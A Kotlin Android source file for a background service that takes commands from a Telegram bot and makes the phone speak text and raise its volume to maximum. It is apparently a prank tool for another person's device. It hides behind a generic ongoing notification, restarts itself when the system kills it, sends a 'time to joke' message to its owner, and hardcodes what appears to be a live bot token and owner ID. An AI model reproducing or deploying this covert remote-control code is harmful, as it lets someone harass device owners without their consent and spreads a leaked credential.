package com.example.remotetts

import android.app.*
import android.content.Intent
import android.media.AudioManager
import android.os.Build
import android.os.IBinder
import android.speech.tts.TextToSpeech
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.Locale
import java.util.concurrent.TimeUnit

class TtsService : Service(), TextToSpeech.OnInitListener {
    private var tts: TextToSpeech? = null
    private var isPolling = true
    
    // ТВОИ ДАННЫЕ
    private val botToken = "9239668558:AAENlCeu7iG5KRVieYhgV5oDbpZS7qr7orc"
    private val ownerId = 1282499155L 
    
    private var lastUpdateId = 0L
    private var isFirstConnect = true

    private val client = OkHttpClient.Builder()
        .readTimeout(40, TimeUnit.SECONDS)
        .connectTimeout(40, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        tts = TextToSpeech(this, this)
        startTelegramPolling()
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            tts?.language = Locale.getDefault()
        }
    }

    private fun startTelegramPolling() {
        Thread {
            while (isPolling) {
                try {
                    val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$lastUpdateId&timeout=30"
                    val request = Request.Builder().url(url).build()
                    val response = client.newCall(request).execute()
                    val body = response.body?.string() ?: continue
                    
                    val json = JSONObject(body)
                    if (json.getBoolean("ok")) {
                        val updates = json.getJSONArray("result")
                        for (i in 0 until updates.length()) {
                            val update = updates.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id") + 1
                            
                            // Отправка "пора шутить" при первом запуске
                            if (isFirstConnect) {
                                sendMessageToOwner("пора шутить")
                                isFirstConnect = false
                            }
                            
                            val message = update.optJSONObject("message") ?: continue
                            val chatId = message.getJSONObject("chat").getLong("id")
                            val text = message.optString("text", "")

                            if (chatId == ownerId) {
                                handleCommand(text)
                            }
                        }
                    }
                } catch (e: Exception) {
                    // При ошибке сети ждём 5 секунд и пробуем снова
                    try { Thread.sleep(5000) } catch (_: InterruptedException) {}
                }
            }
        }.start()
    }

    private fun sendMessageToOwner(text: String) {
        try {
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val json = JSONObject().put("chat_id", ownerId).put("text", text)
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().close()
        } catch (_: Exception) {}
    }

    private fun handleCommand(text: String) {
        if (text.startsWith("/txt ")) {
            val speakText = text.substring(5)
            tts?.setPitch(0.6f)
            tts?.setSpeechRate(0.9f)
            tts?.speak(speakText, TextToSpeech.QUEUE_FLUSH, null, "remote")
            sendMessageToOwner("✅ Сказано: $speakText")
            
        } else if (text.startsWith("/volume ")) {
            val level = text.substring(8).trim().toIntOrNull()
            if (level != null) {
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                am.setStreamVolume(AudioManager.STREAM_MUSIC, level * max / 100, 0)
                sendMessageToOwner("🔊 Громкость: $level%")
            }
            
        } else if (text.startsWith("/all_pool ")) {
            val speakText = text.substring(10)
            val am = getSystemService(AUDIO_SERVICE) as AudioManager
            val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
            tts?.setPitch(0.6f)
            tts?.setSpeechRate(0.9f)
            tts?.speak(speakText, TextToSpeech.QUEUE_FLUSH, null, "remote")
            sendMessageToOwner("📢 ALL_POOL на 100%: $speakText")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("tts_service", "Remote TTS", NotificationManager.IMPORTANCE_LOW)
            channel.setSound(null, null)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, "tts_service")
            .setContentTitle("Служба активна")
            .setContentText("Ожидание команд")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true) // Не даёт смахнуть уведомление
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Автоперезапуск при убийстве системой
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isPolling = false
        tts?.shutdown()
        super.onDestroy()
    }
}